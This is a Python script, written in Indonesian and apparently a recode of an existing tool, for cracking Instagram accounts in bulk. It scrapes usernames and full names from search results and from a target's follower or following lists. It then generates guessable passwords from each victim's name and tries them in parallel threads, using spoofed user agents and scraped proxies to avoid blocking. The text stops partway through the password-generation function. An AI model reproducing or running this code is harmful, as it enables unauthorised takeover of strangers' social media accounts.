# coding:utf-8
#/usr/bin/python
# ini cuma recode mksh ya
# udh di dec
author     = 'JORDI'
status = 'Premium'
kontak = 'Baca'
try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
    from cleantext import clean
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
#-------------{ ini gua jadikan komen sewaktu waktu mau ganti tinggal ubah pagar aja } ------------#
#meua = 'Mozilla/5.0 (MAMAK MU) AppleWebKit/BAPA MU (KHTML, like Gecko) EWE/PAKSA Instagram 99.1.0.99.999 (PERSETANAN; BUAT KANG DEC; en_US; en-US; MAMAKMU KU EWE PAKSA)'
#meua = 'Mozilla/5.0 (Linux; Android 8.1.0; motorola one Build/OPKS28.63-18-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 Instagram 72.0.0.21.98 Android (27/8.1.0; 320dpi; 720x1362; motorola; motorola one; deen_sprout; qcom; pt_BR; 132081645)'
meua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 99.1.0.99.999 (iPhone12,1; iOS 15_5; en_US; en-US; scale=2.00; 828x1792; 383361019)'
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
try:
    os.mkdir('result')
except:
    pass
    
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')
    
open('stat.log', 'w').write('')
prox = open('.prox.txt', 'r').read().splitlines()
CY = '\033[96;1m'
MG = '\033[1;35m'  # MAGENTA
H = '\033[1;32m'  # HIJAU
M = '\033[1;31m'  # MERAH
B = '\033[1;94m'  # BIRU
K = '\033[1;33m'  # KUNING
P = '\033[0;107m'  # PUTIH
U = '\033[1;35m'  # UNGU
O = '\033[38;2;255;127;0;1m'  # ORANGE
C = '\033[0m'  # CLEAR
N = '\x1b[0m'  # WARNA MATI
USN = "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)"
# USN="Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei Social Phone Build/HWIX3) AppleWebKit/533.1 (KHTML, like Gecko) Dolphin/10.1.1005.22 Mobile Safari/533.1"
ugen = open('ua.txt', 'r').read().splitlines()
internal, external, success, checkpoint, loop, following, lisensikuni, lisensiku = [], [], [], [], 0, [], [], ['sukses']

ugen2=[]
s=requests.Session()
for xd in range(1000):
	aa='Mozilla/5.0 (OneBrowser/3.5'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='HUAWEI Y535D-C00'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/534.30'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uaku)

def genUA() :
    uaz = [
    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}..0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (26/8.0.0; 480dpi; 1080x2040; HUAWEI; RNE-L21; HWRNE; hi6250; ru_RU; 147375143)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}..0.1; MI 5s Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.81 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (23/6.0.1; 480dpi; 1080x1920; Xiaomi; MI 5s; capricorn; qcom; ru_RU; 135374896)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}.1.1; SM-E500H Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/5.1.1; 320dpi; 720x1280; samsung; SM-E500H; e53g; qcom; en_ID; 98288239)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}.0.0; HTC 10 Build/OPR1.170623.027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (26/8.0.0; 640dpi; 1440x2560; HTC/htc; HTC 10; htc_pmeuhl; htc_pme; nl_NL; 385416235)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}.1; LG-H815 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/5.1; 640dpi; 1440x2392; LGE/lge; LG-H815; p1; p1; en_ID; 98288242)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/7.0; 480dpi; 1080x1920; samsung; SM-G935F; hero2lte; samsungexynos8890; en_ID; 98288242)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}.0; XT1585 Build/NCK25.118-10.5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/7.0; 640dpi; 2368x1440; motorola; XT1585; kinzie; qcom; id; 98288242)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}.0; SM-G950F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/7.0; 480dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; en_ID; 98288242)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (26/8.0.0; 480dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; en_ID; 98288242)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; en_ID; 98288242)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}.0; Lenovo K33b36 Build/NRD90N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; en_ID; 103516666)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}.0.1; LG-H342 Build/LRX21Y; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (21/5.0.1; 240dpi; 480x786; LGE/lge; LG-H342; c50ds; c50ds; en_ID; 102221277)',

    f'Mozilla/5.0 (Linux; Android {random.randrange(5,12)}.0; MI MAX Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/7.0; 440dpi; 1080x1920; Xiaomi; MI MAX; hydrogen; qcom; en_ID; 98288242)'
    ]
    return uaz[random.randrange(0,len(uaz) -1)]

def genUA2() :
    dpis = ['240dpi', '480dpi', '320dpi', '440dpi', '640dpi']
    uaz = [
    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (23/{random.randrange(5,12)}.0.1; {random.choice(dpis)}; 1080x2040; HUAWEI; RNE-L21; HWRNE; hi6250; ru_RU; 147375143)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (27/{random.randrange(5,12)}.1.0; {random.choice(dpis)}; 1080x1920; Xiaomi; MI 5s; capricorn; qcom; ru_RU; 135374896)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1.1; {random.choice(dpis)}; 1080x2134; Xiaomi/Redmi; Redmi Note 8 Pro; begonia; mt6785; pt_BR; 382290498)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1.1; {random.choice(dpis)}; 1440x2560; HTC/htc; HTC 10; htc_pmeuhl; htc_pme; nl_NL; 385416235)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1; {random.choice(dpis)}; 1440x2392; LGE/lge; LG-H815; p1; p1; id_EN; 98288242)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {random.choice(dpis)}; 1080x1920; samsung; SM-G935F; hero2lte; samsungexynos8890; en_ID; 98288242)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {random.choice(dpis)}; 2368x1440; motorola; XT1585; kinzie; qcom; id; 98288242)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {random.choice(dpis)}; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; en_ID; 98288242)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (26/{random.randrange(5,12)}.0.0; {random.choice(dpis)}; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; en_ID; 98288242)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {random.choice(dpis)}; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; id_EN; 98288242)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {random.choice(dpis)}; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; en_ID; 103516666)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (21/{random.randrange(5,12)}.0.1; {random.choice(dpis)}; 480x786; LGE/lge; LG-H342; c50ds; c50ds; en_ID; 102221277)',

    f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {random.choice(dpis)}; 1080x1920; Xiaomi; MI MAX; hydrogen; qcom; en_ID; 98288242)'
    ]
    return random.choice(uaz)

# CLEAR
def clear():
    os.system('clear')
 
# BANNER
def banner():
    clear()
    au='''[blue] ____  _     ___   _     ___   _   ___
| |_  \ \_/ | |_) | |   / / \ | | | | \ 
|_|__ /_/ \ |_|   |_|__ \_\_/ |_| |_|_/ 
'''
    cetak(nel(au, style='blue',title=f'EXPLOID'))
try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
    
def jewel():
    cetak(nel('====================================================='))

def user_id_default():
    if sys.platform == "win32" or not hasattr(os, "geteuid"):
        return 1337
    return os.geteuid()

def chk(): 
  uuid = str(user_id_default()) + str(os.getlogin()) 
#   id = '1|0|2|7|7|u|0|_|a|2|7|7' 
  id = "|".join(uuid) 
  print ("SELAMAT DATANG DI EXPLOID TOOLS")
  print("\x1b[1;97m [\033[1;91m\x1b[1;97m]\033[1;93m  ID KAMU : "+id) 
  print ("CRACKED IS READY")
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/exploid-nitch/ighe/main/use.txt").text 
    if id in httpCaht: 
      print("\x1b[1;97m [\033[1;92m\x1b[1;97m]\033[1;97m  ID KAMU AKTIF........\033[97m") 
      msg = str(user_id_default()) 
      time.sleep(1) 
      pass 
    else: 
      print("\x1b[1;97m [\033[1;91m\x1b[1;97m]\033[1;93m ID TIDAK AKTIF SILAHKAN WHATSAPP KE ADMIN\033[97m") 
      time.sleep(1) 
      #sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print (logo)
     chk() 
    
chk()
os.system('clear')


def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        cetak(nel('[white] Gagal masuk/login', style='green'))
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external,user

def User_Agent():
    dpi_phone = [
        '133','320','515','160','640','240','120'
        '800','480','225','768','216','1024']
    model_phone = [
        'Nokia 2.4','HUAWEI','Galaxy',
        'Unlocked Smartphones','Nexus 6P',
        'Mobile Phones','Xiaomi',
        'samsung','OnePlus']
    pxl_phone = [
        '623x1280','700x1245','800x1280',
        '1080x2340','1320x2400','1242x2688']
    i_version = [
        '114.0.0.20.2','114.0.0.38.120',
        '114.0.0.20.70','114.0.0.28.120',
        '114.0.0.0.24','114.0.0.0.41']
    User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
    return User_Agent

def user_agent():
    resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
    versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
    dpis = ['120', '160', '320', '240']
    ver = random.choice(versions)
    dpi = random.choice(dpis)
    res = random.choice(resolutions)
    return (
        'Instagram 4.{}.{} '
        'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
    ).format(
        random.randint(1, 2),
        random.randint(0, 2),
        random.randint(10, 11),
        random.randint(1, 3),
        random.randint(3, 5),
        random.randint(0, 5),
        dpi,
        res,
        ver,
        ver,
    )

def user_agentAPI():
    APP_VERSION = "248.0.0.17.109"
    VERSION_CODE = "364804736"
    DEVICES = {
        "one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
        "one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
        "samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
        "huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
        "samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
        "one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
        "lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
        "zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
        "samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
    DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
    app_version = DEVICES[DEFAULT_DEVICE]['app_version']
    android_version = DEVICES[DEFAULT_DEVICE]['android_version']
    android_release = DEVICES[DEFAULT_DEVICE]['android_release']
    dpi = DEVICES[DEFAULT_DEVICE]['dpi']
    resolution = DEVICES[DEFAULT_DEVICE]['resolution']
    manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
    device = DEVICES[DEFAULT_DEVICE]['device']
    model = DEVICES[DEFAULT_DEVICE]['model']
    cpu = DEVICES[DEFAULT_DEVICE]['cpu']
    version_code = DEVICES[DEFAULT_DEVICE]['version_code']
    USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
    return USER_AGENT_BASE  

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            sol()
            io = '[white][1] Login Menggunakan Cookie\n[2] Login Menggunakan Username & Password'
            cetak(nel(io, title=f'• menu login •',style='blue'))
            loginpil=input(f"  [{K}+{C}] Pilih :  ")
            if loginpil=='1':
                cetak(nel(' [white]Gunakan username dan cookies instagram untuk login. sebelum login  pastikan akun bersifat publik bukan privat', style='blue'))
                us=input(f'  [{K}+{C}] Masukan Username :{C}')
                cok=input(f'  [{K}+{C}] Masukan Cookie :{C}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                os.system('python run.py')
            elif loginpil == '2':
                login()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()
def login():
    global external
    try:
        cetak(nel('[white]Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat', style='blue'))
        us=input(f"  [{K}+{C}] Masukan username: {C}")
        pw=stdiomask.getpass(prompt=f'  [{K}+{C}] Masukan password: {C}')
    except KeyboardInterrupt:
        wel = '# KeyboardInterrupt terdeteksi... keluar !'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        exit()
    x=instagramAPI(us,pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'\n{H}>{C} Login berhasil')
        os.system('python run.py')
    elif x.get('status')=='checkpoint':
        wel = '# Login checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()
    else:
        wel = '# Username atau password yang anda masukan salah'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()


class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            welcome=f'''
[{K}+{C}] Username   : {H}{self.username}                {C}[{K}+{C}] Author : {H}{author}
[{K}+{C}] Followers  : {H}{followers}                          {C}[{K}+{C}] WhatsApp :{H}{kontak}
[{K}+{C}] Following  : {H}{following}                          {C}[{K}+{C}] Status : {H}{status}
'''
            print(welcome)
            io='''  [white][01] Crack Dari Pencarian              [03] Crack dari Mengikuti
  [02] Crack Dari Pengikut               [04] Result'''
            cetak(nel(io, style='blue',title=f' • Menu •', subtitle='Ketik D untuk informasi script'))

    def BUG(self):
        donasi=f'''[white]- Hai selamat datang di script saya mungkin kamu adalah penguna baru !
- script ini Masi Dalam Perbaruan
- saya sarankan menggunakan kartu Indosat,xl,exis,3
- jika di antara kalian ada yang mau memberikan donasi kesaya
- bisa menghubungi kontak saya 
- +62-812-7034-7986
- donasikan seikhlasnya ya 
- besar atau kecilnya itu gk penting yang penting ikhlas 
- saya ucapkan terima kasih
- JORDI X Codee 
- Tombol Ganti Tumbal tekan 0
- single project'''
        cetak(nel(donasi, title=' • informasi • ', style='green'))
        sleep(0.50)
        exit()

    def ChangeLog(self):
        io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fitur yang di update'))

        io='[1] Bot unfollow instagram\n[2] Bot spam komen'
        oi = nel(io, style='cyan')
        cetak(nel(oi, title='Fitur tambahan'))

        io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fix Bug'))
        exit()

    def Exit(self):
        cetak(nel('[white][+] Apakah anda yakin ingin keluar?', style='blue'))
        x=input(f'  [+] keluar y/t ? : {C}')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            os.system('python run.py')
        elif x in ('t','T'):
            os.system('python run.py')
        else:
            self.Exit()

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})

        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
        return internal

    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}[+] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(f"\n{M}[+] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:lisensi()

    def infoAPI(self, cookie, api, id, mode='followers'):
        if 'sukses' in lisensiku:
            try:
                cetak(nel('[white][+] TUNGGU SEDANG MENGUMPULKAN ID ', style='blue'))
                x = s.get(api % (id), cookies=cookie,
                          headers={"user-agent": USN})
                x_jason = json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid = x_jason['next_max_id']
                    for z in range(9999):
                        x = s.get(f'https://i.instagram.com/api/v1/friendships/'+id +
                                  f'/{mode}/?count=100&max_id='+maxid, cookies=cookie, headers={"user-agent": USN})
                        x_jason = json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                maxid = x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:
                    pass
            except requests.exceptions.ConnectionError:
                exit(f'\n{M}∝╬[!] Koneksi internet bermasalah{C}')
            except Exception as e:
                if 'Please wait' in str(x_jason):
                    msg = x_jason['message']
                else:
                    msg = '∝╬[!] Username yang anda masukan tidak di temukan'
                print(
                    f'\n{M}{msg}{C}')
            return internal
        else:
            lisensi()

    def passwordAPI(self,xnx):
        cetak(nel(f'[white][+] TOTAL ID  : {len(internal)}', style='blue'))
        komb = '''
[white][1] Name,Name123,Name1234
[2] Name,Name123,Name1234,Name12345
[3] Name,Name123,Name1234,Name12345,Name123456,Name1234567,Name12345678
[4] Name,Name123,Name1234,Name123456,Name1234567,Name321,Name4321,qwertyuiop,1q2w3e4r
[05]  Password Manual'''
        cetak(nel(komb, style='blue', title='kombinasi'))
        c=input(f'  [+] Masukan Pilihan :{C} ')
        if c == '1':
            self.generateAPI(xnx, c)
        elif c == '2':
            self.generateAPI(xnx, c)
        elif c == '3':
            self.generateAPI(xnx, c)
        elif c == '4':
            self.generateAPI(xnx, c)
        elif c == '5':
            cetak(nel('[white][+]PASSWORD MANUAL', style='blue'))
            print(f'{M} Contoh sayang,anjing,bangsat')
            zx=input(f'  [{K}+{C}] List password :{C} ')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        cetak(nel(f'[white][•] Hasil OK disimpan ke: hasil/{day}.txt\n[•] Hasil CP disimpan ke: hasil/{day}.txt', style='blue'))
        cetak(nel('[white][+] Proses Crack Bila spam IP, harap hidupkan modpes 5 detik', style='blue'))
        with ThreadPoolExecutor(max_workers=20) as shinkai:
            for i in user:
                try:
                    username = i.split("|")[0]
                    password = clean(text=i.split(
                        "|")[1].lower(), no_emoji=True)
                    for w in password.split(" "):
                        if len(w)<3:
                            continue
                        else:
                            if o == "1":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w.lower(), f'{w}123'.lower(), f'{w}1234'.lower(), w.upper(), f'{w}123'.upper(), f'{w}1234'.upper()]
                                else:
                                    sandi = [w]
                            elif o == "2":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [f'{w}123', f'{w}1234', f'{w}12345', f'{w}123'.upper(), f'{w}1234'.upper(), f'{w}12345'.upper()]
                                else:
                                    sandi = [w.lower(), w.upper()]
                            elif o == "3":
